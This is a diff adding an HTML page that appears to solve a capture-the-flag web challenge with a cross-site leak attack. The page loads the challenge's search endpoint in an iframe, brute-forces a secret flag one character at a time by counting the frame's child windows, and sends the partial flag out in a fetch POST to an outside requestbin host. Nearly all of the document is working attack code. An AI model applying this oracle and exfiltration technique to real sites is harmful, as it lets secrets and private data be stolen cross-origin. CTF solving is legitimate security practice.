@@ -1,0 +1,60 @@
+<html>
+
+<head>
+    <script src="https://code.jquery.com/jquery-3.4.1.min.js"></script>
+    <script>
+        window.onload = function () {
+            var flag = "fb{cr055_s173_l34|<5_4r4_c00o";
+            //var flag = "fffff";
+            var cur_flag = flag;
+            var cur_char = "";
+            var frame = document.getElementById("xss");
+            var i = 0;
+            frame.onload = function () {
+                if (frame.contentWindow.length == 1) {
+                    console.log("Success!");
+                    console.log(cur_flag);
+                    if (cur_char === "_" || cur_char === "}") {
+                        const url = 'http://requestbin.fullcontact.com/142e9or1';
+                        fetch(url, {
+                            method: 'POST', // *GET, POST, PUT, DELETE, etc.
+                            mode: 'no-cors', // no-cors, cors, *same-origin
+                            cache: 'no-cache', // *default, no-cache, reload, force-cache, only-if-cached
+                            credentials: 'omit', // include, *same-origin, omit
+                            headers: {
+                                'X-Flag': cur_flag
+                            },
+                        });
+                    }
+
+                    flag = cur_flag;
+                    i = 0;
+                    try_next_char();
+                } else {
+                    i++;
+                    if (i <= num_chars) {
+                        try_next_char();
+                    }
+                }
+            };
+
+            var chars = "}0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ!\"#$%&'()*+,-./:;<=>?@[\\]^_`{|}~ \t\n\r\x0b\x0c";
+
+            var num_chars = chars.length;
+
+            function try_next_char() {
+                cur_char = chars[i];
+                cur_flag = flag + cur_char;
+                frame.src = "http://challenges.fbctf.com:8082/search?query=" + cur_flag;
+            }
+
+            try_next_char();
+        }
+    </script>
+</head>
+<body>
+    <iframe id="xss" src="http://challenges.fbctf.com:8082/search?query=0">
+
+    </iframe>
+</body>
+</html>
